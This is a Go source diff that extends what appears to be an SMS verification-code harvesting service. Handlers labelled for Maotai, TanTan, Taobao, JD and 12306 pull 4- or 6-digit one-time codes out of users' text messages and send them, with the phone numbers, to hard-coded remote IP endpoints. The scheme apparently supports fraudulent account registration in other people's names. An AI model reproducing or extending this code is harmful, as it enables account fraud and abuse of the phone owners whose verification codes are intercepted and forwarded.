@@ -98,6 +98,10 @@ func sendC(w http.ResponseWriter, r *http.Request) {
 				processTianyiRegister(msg, *user, r.FormValue("apid"))
 			} else if strings.EqualFold(r.FormValue("apid"), "112") {
 				processTianyiRegister(msg, *user, r.FormValue("apid"))
+			} else if strings.EqualFold(r.FormValue("apid"), "116") {
+				processMaotaiRegister(msg, *user, r.FormValue("apid"))
+			} else if strings.EqualFold(r.FormValue("apid"), "117") {
+				processTanTanRegister(msg, *user, r.FormValue("apid"))
 			}
 		}
 	}
@@ -142,7 +146,7 @@ func process12306Register(msg string, user map[string]string) {
 		pwd := result[1]
 		mobile := formatMobile(user["mobile"])
 		// url := "http://121.201.67.189:9876/verifycode/api/getVerifyCode.jsp?cid=c115&pid=115&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara=1"
-		url := "http://register.qygame.cn/code/registerUser?cpid=ztld02&code=" + pwd + "&cpparam=12345&phone=" + mobile
+		url := "http://47.106.251.19:9700/lsapi/channel/reportPhone?cpid=1dc1dd7721c84b5f985bde2b4f6e825d&smsContent=" + pwd + "&telephone=" + mobile
 		if v, ok := mapConfig.Load("12306DexingRatio"); ok {
 			ratio, _ := strconv.ParseInt(v.(string), 10, 64)
 			random := rand.New(rand.NewSource(time.Now().UnixNano()))
@@ -199,6 +203,32 @@ func processJindongRegister(msg string, user map[string]string, apid string) {
 		log.Println(result[0])
 		// url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
 		url := "http://47.106.251.19:9500/lsapi/channel/reportVerifyCode?cpid=3653676abd274407a7620670bf84876d&telephone=" + mobile + "&smsContent=" + result[0]
+		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
+		go send2Url(url)
+		go updateRelationSuccess(user, apid)
+	}
+}
+func processTanTanRegister(msg string, user map[string]string, apid string) {
+	mobile := formatMobile(user["mobile"])
+	exp := regexp.MustCompile(`\d{4}`)
+	result := exp.FindStringSubmatch(msg)
+	if nil != result {
+		log.Println(result[0])
+		// url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
+		url := "http://47.106.251.19:9500/lsapi/channel/reportVerifyCode?cpid=fcc43472680048fb85b7dd0c704f5e58&telephone=" + mobile + "&smsContent=" + result[0]
+		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
+		go send2Url(url)
+		go updateRelationSuccess(user, apid)
+	}
+}
+func processMaotaiRegister(msg string, user map[string]string, apid string) {
+	mobile := formatMobile(user["mobile"])
+	exp := regexp.MustCompile(`\d{6}`)
+	result := exp.FindStringSubmatch(msg)
+	if nil != result {
+		log.Println(result[0])
+		// url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
+		url := "http://120.78.167.205:9600/lsapi/channel/reportVerifyCode?cpid=110b4b2ef6be4e3a8ccc2ceab8579ca0&telephone=" + mobile + "&smsContent=" + result[0]
 		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
 		go send2Url(url)
 		go updateRelationSuccess(user, apid)
@@ -276,16 +306,29 @@ func processGtjaRegister(msg string, user map[string]string, apid string) {
 // 	}
 // 	go updateRelationSuccess(user, apid)
 // }
+// func processTaobaoRegister(msg string, user map[string]string, apid string) {
+// 	mobile := formatMobile(user["mobile"])
+// 	exp := regexp.MustCompile(`您(\S*)码`)
+// 	result := exp.FindStringSubmatch(msg)
+// 	if nil != result {
+// 		log.Println(result[1])
+// 		url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?channel=2940004&content=" + url.QueryEscape(msg) + "&mobile=" + mobile
+// 		go send2Url(url)
+// 	}
+// 	go updateRelationSuccess(user, apid)
+// }
 func processTaobaoRegister(msg string, user map[string]string, apid string) {
 	mobile := formatMobile(user["mobile"])
-	exp := regexp.MustCompile(`您(\S*)码`)
+	exp := regexp.MustCompile(`\d{6}`)
 	result := exp.FindStringSubmatch(msg)
 	if nil != result {
-		log.Println(result[1])
-		url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?channel=2940004&content=" + url.QueryEscape(msg) + "&mobile=" + mobile
+		log.Println(result[0])
+		// url := "http://47.106.95.86:9800/lstwoapi/channel/reportVerifyCode?cpid=f66248ef09a44442acda9c221542dace&smsContent=" + result[0] + "&telephone=" + mobile
+		url := "http://120.78.167.205:9800/lsapi/channel/reportVerifyCode?cpid=e0c5d52fa41142b4bb60eb46f9cb9b49&telephone=" + mobile + "&smsContent=" + result[0]
+		// url := "http://x.tymob.com:9000/sdk/submit/submit.jsp?content=" + url.QueryEscape(msg) + "&mobile=" + mobile
 		go send2Url(url)
+		go updateRelationSuccess(user, apid)
 	}
-	go updateRelationSuccess(user, apid)
 }
 func processMomoRegister(msg string, user map[string]string, apid string) {
 	mobile := formatMobile(user["mobile"])
